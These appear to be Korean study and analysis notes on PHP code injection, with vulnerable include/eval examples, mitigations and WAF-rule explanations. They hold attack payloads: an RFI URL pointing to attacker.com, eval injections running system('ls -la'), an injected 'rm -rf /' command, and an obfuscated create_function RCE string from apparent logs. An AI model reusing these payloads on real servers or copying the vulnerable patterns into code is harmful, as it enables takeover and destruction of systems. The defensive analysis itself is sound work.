## **코드 인젝션 (Code Injection) 취약점**

**코드 인젝션(Code Injection)** 취약점은 공격자가 악성 코드를 서버의 실행 과정에 삽입하여 실행하도록 만드는 공격입니다. PHP에서는 **`include()`, `include_once()`, `require()`, `require_once()`, `eval()`** 함수들을 자주 사용하게 되는데, 이 함수들이 제대로 검증되지 않은 외부 입력을 처리할 경우 공격자가 악성 코드를 삽입하고 실행시킬 수 있습니다.

#### **1. include(), require() 함수 취약점**

`include()`나 `require()`는 외부 PHP 파일을 포함시킬 때 사용되는 함수입니다. 이 함수들은 웹 입력을 통해 동적으로 포함되는 파일 경로를 받아 처리하는데, 사용자가 입력한 데이터를 검증 없이 파일 경로로 사용하면 **파일 포함 공격**(File Inclusion Attack)에 취약해질 수 있습니다.

예시:

```php
<?php
  $file = $_GET['id'];  // 사용자 입력
  include($file . ".php");  // 외부 파일 포함
?>
```

위 코드에서 `$_GET['id']` 값을 통해 사용자가 파일 경로를 입력하면, 해당 파일이 포함되어 실행됩니다. 문제는 **경로 탐색 공격**이나 **악성 파일 포함**이 가능해진다는 것입니다.

#### **취약점 설명**

* **상위 디렉터리 탐색 공격**: `../`를 이용하여 다른 디렉터리로 이동할 수 있습니다. 이를 통해 서버의 민감한 파일을 포함시킬 수 있습니다.
* **원격 파일 포함 (RFI)**: 만약 서버에서 `allow_url_include` 설정이 켜져 있으면, 공격자는 원격 서버에 있는 악성 PHP 파일을 포함시킬 수 있습니다.

#### **2. eval() 함수 취약점**

`eval()` 함수는 PHP 코드를 **문자열로** 실행하는 함수입니다. 이 함수에 사용자 입력이 들어가면 공격자가 **PHP 코드를 실행**시킬 수 있습니다.

예시:

```php
<?php
  $code = $_GET['code'];  // 사용자 입력
  eval($code);  // 사용자 입력을 PHP 코드로 실행
?>
```

#### **취약점 설명**

* 공격자가 **자기 자신의 PHP 코드를** 입력하여 서버에서 실행시킬 수 있습니다. 예를 들어, 서버에서 임의의 명령어를 실행하거나 시스템을 제어하는 악성 코드를 넣을 수 있습니다.
* 이 경우, 사용자가 제공한 **코드가 그대로 실행되기 때문에** 이를 검증하지 않으면, 원격에서 악성 PHP 코드를 실행시킬 수 있습니다.

---

### **공격 페이로드 예시**

#### **1. 파일 포함 취약점 공격 (LFI 또는 RFI)**

##### **RFI (Remote File Inclusion)** 공격

`allow_url_include`가 활성화되어 있으면, 원격 서버에서 파일을 포함시킬 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?id=http://attacker.com/malicious.php
```

위의 URL은 `attacker.com`에 위치한 악성 PHP 파일을 포함시키려는 공격입니다. 이 파일은 서버에서 실행되어 **악성 코드**를 삽입할 수 있습니다.

#### **2. eval() 함수 취약점 공격**

**PHP 코드 실행**을 위해 `eval()` 함수가 사용될 때, 공격자는 악성 PHP 코드를 입력하여 서버에서 실행시킬 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?code=phpinfo();
```

위의 URL은 `phpinfo()` 함수를 실행하여 서버의 **환경 정보**를 출력하는 PHP 코드를 실행시키는 공격입니다. 이 정보를 통해 공격자는 서버에 대한 중요한 정보를 얻을 수 있습니다.

#### **3. 악성 코드 삽입**

`eval()` 함수에 악성 PHP 코드를 삽입할 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?code=system('ls -la'); // 서버 명령어 실행
```

이 코드는 `system('ls -la')` 명령을 실행하여 서버의 파일 목록을 출력합니다. 이처럼 `eval()`을 악용하면 **서버 명령어 실행**을 통해 공격자가 서버를 제어할 수 있습니다.

```
GET /api.php?file=example.txt;rm%20-rf%20/
```







---
* 코드(Code) 인젝션서버의 PHP 코드 실행 과정에 공격자의 코드를 삽입시키는 위협으로 가장 많은 공격은 서버에서 수행 코드를 내포시키는 include(), include_once(), require(), require_once() 함수들을 대상으로 해서 자신의 코드가 실행 과정에 반영되도록 하는 것입니다.
* include ($_GET['id'].".php");위의 사례처럼 웹 입력 자료를 기반으로 이들 함수를 사용한다면 철저한 사전 검사를 해야 합니다.
* 또다른 코드 인젝션의 위험성은 eval() 함수 사용입니다. eval() 함수로 PHP 코드를 문자열로 전달하면 그대로 수행하기 때문에 eval() 함수 파라미터가 혹여라도 웹 입력과 연관성이 있다면 철저한 사전 검사를 반드시 수행해야 합니다.






---
① query: s=captcha
입력값 검증이 없고, 사용자가 s 파라미터에 임의의 값을 넣을 수 있다면 LFI 등이 발생할 수 있다.



---
② 
tag/index=&tag=%7Bpbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)%7D(123)%7B/pbhome/Indexoot:if%7D&tagstpl=news.html&lnoc2tspfar1_ue

## 🧨 원본 URL 파라미터 (축약 정리)

```txt
tag/index=&tag={
  pbohome/Indexot:if(1)(
    usort(
      post(1),
      create_function(
        post(2),
        post(3)
      )
    )
  );
}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue
```

(※ `%7B`, `%7D` → `{`, `}`,
`/*%3e*/` → `/*>*/` 로 변형해 난독화된 상태)

---

## 🕵️‍♂️ 이건 어떤 공격인가?

### 🛠️ 공격 기법: **PHP Code Injection / Remote Code Execution**

이 문자열은 PHP 코드에서 흔히 사용되는 구조인 `create_function`과 `usort()` 등을 이용해,
**동적으로 코드 실행을 시도하는 형태**입니다.

---

## 📌 주요 요소 분석

### 1. **`create_function` 사용**

```php
create_function(post(2), post(3))
```

* 이는 PHP의 오래된 함수로, 문자열 형태의 코드를 함수로 생성할 수 있음.
* PHP 7.2 이후 제거되었지만, **구버전에서는 치명적인 RCE 수단**으로 쓰임.

### 2. **`usort(post(1), ..., ...)`**

* `usort()`은 배열 정렬 함수인데, 콜백 함수에 **임의 코드 실행을 유도**할 수 있음.
* `post(n)` 구조는 공격자가 자신이 원하는 데이터를 POST로 넘기겠다는 의미일 수 있음.

### 3. **난독화 (`/*%3e*/`, 중첩 괄호, `tag=` 파라미터 활용 등)**

* 필터 우회를 위해 일부 문자들을 주석 처리하거나 인코딩
* 예: WAF가 `create_function`을 막더라도 `cre/*>*/ate_function`처럼 쪼개면 우회 가능

---

## 📌 목적은?

이 페이로드의 목적은:

> 🔥 서버가 이 입력값을 **eval, include, unserialize, preg\_replace** 등으로 실행하게 만들어서
> **임의 코드 실행** → **웹쉘 삽입** → **시스템 장악**

---

## 🔴 결론: **공격 시도임 (고위험)**

이건 **고도로 난독화된 코드 인젝션** 시도로,
**PHP 구버전 기반의 취약 웹사이트**를 타겟으로 만들어진 공격 페이로드입니다.

---

## ✅ 대응 방안

| 항목           | 조치                                                                          |
| ------------ | --------------------------------------------------------------------------- |
| 서버 코드 확인     | 이 `tag` 파라미터나 `create_function`, `usort`가 사용자 입력으로 실행되는지 확인                 |
| PHP 버전 업그레이드 | `create_function`은 PHP 7.2부터 제거됨 — 최신 PHP로 필수 업그레이드                         |
| 입력 필터링       | `tag`, `tagstpl` 같은 파라미터에서 `{}`, `(`, `)`, `;`, `create_function` 등의 문자열 차단 |
| WAF 룰 설정     | 해당 문자열 패턴 탐지/차단하는 룰 추가 (또는 ModSecurity 사용)                                  |
| 로그 확인        | 이 요청을 보낸 IP 및 유사 요청의 빈도 파악 → IP 차단 또는 경고 설정                                 |

---

좋습니다. 지금 보여주신 내용은 **WAF(Web Application Firewall) 또는 IDS/IPS 시스템의 탐지 룰 정의**로 보이며, 두 가지 PHP 관련 공격 시도를 감지하기 위한 것입니다.

---

## 📌 룰 요약

| 룰 ID      | 이름                                                               | 탐지 대상                                  | 탐지 내용   |
| --------- | ---------------------------------------------------------------- | -------------------------------------- | ------- |
| `3000154` | CMD Injection Attack Detected (Common PHP Function Detected) v.1 | `ARGS_NAMES:<?php echo md5("cmd"); ?>` | `md5(`  |
| `969151`  | PHP Injection Attack (Opening Tag) v.1                           | `ARGS_NAMES:<?php echo md5("cmd"); ?>` | `<?php` |

---

## 🔍 세부 분석

### 🛠️ 1. `rule: 3000154`

#### 이름:

**CMD Injection Attack Detected (Common PHP Function Detected) v.1**

#### 목적:

* PHP 코드 중 **명령어 실행 또는 문자열 조작**에 자주 쓰이는 함수 감지
* 특히 `md5(` 같은 함수는 **우회 체크나 해시 조작에 사용되는 흔한 패턴**

#### 탐지 기준:

* \*\*파라미터 이름 (`ARGS_NAMES`)\*\*이 이 값을 포함:

```php
<?php echo md5("cmd"); ?>
```

* 이 안에 **`md5(`** 가 있는 경우 탐지

> ☑️ 의미: 공격자가 **파라미터 이름에 PHP 코드**를 심어서 서버가 이를 처리하게 만들려는 시도

---

### 🛠️ 2. `rule: 969151`

#### 이름:

**PHP Injection Attack (Opening Tag) v.1**

#### 목적:

* PHP 코드 인젝션 탐지
* 특히 `<?php` 태그는 PHP 코드의 시작을 의미하므로 **가장 명백한 인젝션 시그니처 중 하나**

#### 탐지 기준:

* 마찬가지로 `ARGS_NAMES`에 `<?php echo md5("cmd"); ?>` 같은 입력이 있고
* 그 안에 `<?php` 가 포함되어 있다면 탐지

---

## 🤔 그런데 왜 `ARGS_NAMES`?

보통 WAF 룰에서는:

* `ARGS` → **요청 파라미터의 값**
* `ARGS_NAMES` → **요청 파라미터의 이름**

예: 이 URL을 보세요 👇

```
/test.php?<?php echo md5("cmd"); ?>=value
```

여기서:

* 파라미터 이름: `<?php echo md5("cmd"); ?>`
* 파라미터 값: `value`

☠️ 이런 요청은 **누가 봐도 해킹 시도**입니다.
왜냐하면 파라미터 "이름"에 PHP 코드를 넣었기 때문입니다.
그리고 서버 코드가 이 파라미터 이름을 기반으로 어떤 동작을 하게 된다면,
**RCE(원격 코드 실행)** 가능성도 생깁니다.

---

## 🎯 핵심 요약

| 항목    | 내용                                               |
| ----- | ------------------------------------------------ |
| 탐지 대상 | HTTP 파라미터 "이름" (ARGS\_NAMES)                     |
| 공격 목적 | PHP 코드 인젝션 / 명령어 실행 함수 (`md5`, `<?php`) 포함       |
| 위험도   | 🔥 매우 높음 – 인젝션 또는 RCE 가능성                        |
| 우회 방지 | 주석, 인코딩 등 필터 우회 방식도 추가 룰 필요                      |
| 대응 방안 | 룰 작동 확인, 로그 경고, IP 차단 또는 CAPTCHA, 응답 지연 등 보완책 적용 |

---
④ body에 
<?php 
$_POST/**/[,  
,base64_decode(  문자열 포함




위의 요청은 파일 이름을 전달하는 API에서 쉘 명령어를 주입하여 파일 삭제나 시스템 명령어 실행을 유도할 수 있습니다.

